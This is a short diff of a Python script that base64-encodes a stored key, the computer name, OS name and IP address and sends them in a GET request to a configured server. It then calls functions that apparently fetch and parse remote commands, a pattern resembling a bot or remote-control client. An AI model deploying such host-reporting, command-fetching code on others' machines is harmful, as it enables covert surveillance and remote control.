@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-#Ik ben van plan om alles in base64 te veranderen. Ook de key die in de .kb gaat.
 # File written by Evert Arends, all rights reserverd. First run: Thursday November 26 in 2015 around 3 PM.#
 from __future__ import print_function
 import os, os.path
@@ -56,19 +55,20 @@ def request():
     data = f.readline()
     f.close()
     print(data)
-    s = urlopen(cfg.MY_IP)
-    pip = s.read()
-
+    # s = urlopen(cfg.MY_IP)
+    # pip = s.read()
+    pip = cfg.MY_IP
     # Encoding sData into a base64 string, so I can post spaces and weird characters.
     data = base64.b64decode(data) #decode they key, so its not double encoded.
     str = base64.b64encode(data + ',' + cfg.G_PCNAME + ',' + cfg.G_OSNAME + ',' + pip)
     sData = str
     print("sData = " + sData)
-    # Request URL with a get parameter, which makes it easier to store the data on the serverself.
+    # Request URL with a get parameter, which makes it easier to store the data on the server self.
     P_URL = '{0}{1}{2}'.format(cfg.P_BASE, cfg.P_DATA, sData)
     s = urlopen(P_URL).read()
     print(s)
     get_cmd()
+
 
 def parse_cmd(inp, key):
     """
